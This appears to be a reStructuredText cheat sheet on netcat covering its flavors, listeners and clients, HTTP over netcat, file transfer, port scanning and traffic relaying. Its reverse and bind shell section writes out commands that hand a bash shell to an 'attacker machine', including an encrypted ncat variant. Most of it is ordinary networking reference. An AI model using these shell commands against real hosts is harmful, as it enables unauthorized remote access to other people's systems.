
======
Netcat
======
* `Netcat - All you need to know <https://blog.ikuamike.io/posts/2021/netcat/>`_
    - `HN <https://news.ycombinator.com/item?id=27973020>`__
* `10 useful ncat (nc) Command Examples for Linux Systems <https://lpicentral.blogspot.com/2018/08/10-useful-ncat-nc-command-examples-for.html>`_
* `How to Use Netcat Commands: Examples and Cheat Sheets <https://www.varonis.com/blog/netcat-commands/>`_

Netcat flavors
##############
* Traditional
    - ``sudo apt install netcat-traditional``
    - if other flavor present, call ``nc.traditional`` binary
    - legacy
* GNU
    - To be `downloaded <http://netcat.sourceforge.net/>`__
    - rewritten to be more portable
    - legacy
* OpenBSD
    - ``sudo apt install netcat-openbsd`` (or just ``netcat``)
    - has ``-e`` flag deleted as dangerous
    - supports IPv6, proxies and unix sockets
* Nmap
    - ``sudo apt install ncat``
    - most feature rich

Server / Client mode
####################

Server:

.. code-block:: sh

    nc -lp 8080
    nc -ls 127.0.0.1 -p 8080  # bind to localhost
    nc -lup 8080              # udp
    nc -lk 8080               # force server to stay up
    nc -lU /tmp/socket        # listen to unix socket

Client:

.. code-block:: sh

    nc - 127.0.0.1 8080
    nc -u 127.0.0.1 8080  # udp

Reverse / Bind Shells
#####################

Reverse shells:

.. code-block:: sh

    # Server (attacker machine)
    nc -lp 8080
    # Client (victim machine)
    nc -e /bin/bash 192.168.125.10 8080

Bind shells:

.. code-block:: sh

    # Server (victim machine)
    nc -e /bin/bash -lp 8080
    # Client (attacker machine)
    nc 192.168.125.10 8080

Ncat encrypted reverse shell:

.. code-block:: sh

    ncat --ssl -lp 8080
    ncat --ssl -e /bin/bash 192.168.125.10 8080

    # allow connections only from specific host
    nc --allow 127.0.0.1 -e /bin/bash -lvnp 8000

HTTP Client and Server
######################

Client:

.. code-block:: sh

    {
    cat <<EOF ; sleep 1;
    GET / HTTP/1.0
    Host: wttr.in
    User-Agent: curl

    EOF
    } | nc wttr.in 80

Server:

.. code-block:: sh

    {
    cat <<EOF ; sleep 1;
    HTTP/1.0 200 OK
    Content-Length: $(wc -c <~/.profile)

    EOF
    cat ~/.profile
    } | nc -l 8000

File Transfer
#############

Example:

.. code-block:: sh

    # server1 --> server2
    nc -lp 8080 < infile              # server1
    nc 192.168.125.10 8080 > outfile  # server2

    # server1 <-- server2
    nc 192.168.125.20 8080 < infile  # server1
    # OR nc --send-only 192.168.125.20 8080 < infile  # server1
    nc -lp 8080 > outfile          # server2

Port Scanning
#############

Example:

.. code-block:: sh

    # TCP
    nc -nvv -w 1 -z 127.0.0.1 1-65535 2>&1 |grep -v refused
    # UDP
    nc -nvv -w 1 -z -u 127.0.0.1 1-65535

Traffic Redirection
###################

Only possible on flavors with ``-e`` option:

.. code-block:: sh

    # server1 <-----> server2 <-----> server3
    # run on server2
    # 192.168.125.40 is server3
    ncat -klvnp 8000 -e "/bin/nc 192.168.125.40 8080"

    # MITM with certificate spoofing example
    curl -s https://storage.yandexcloud.net/cloud-certs/CA.pem > ca.crt
    ncat -klvnp 8443 -e "
        /usr/bin/ncat
            --ssl-verify
            --ssl-trustfile ca.pem
            rc1b-inserttheaddress.mdb.yandexcloud.net 8443
    "
    # Check it's working:
    echo 'SHOW DATABASES' |
        curl 'http://localhost:8443/?user=admin&password=NimdaLol' --data-binary @-

Other option:

.. code-block:: sh

    # One way
    nc -l 8080 | nc 192.168.1.200 80

    # Two way proxy
    mkfifo 2way
    nc -l 8080 0<2way | nc 192.168.1.200 80 1>2way
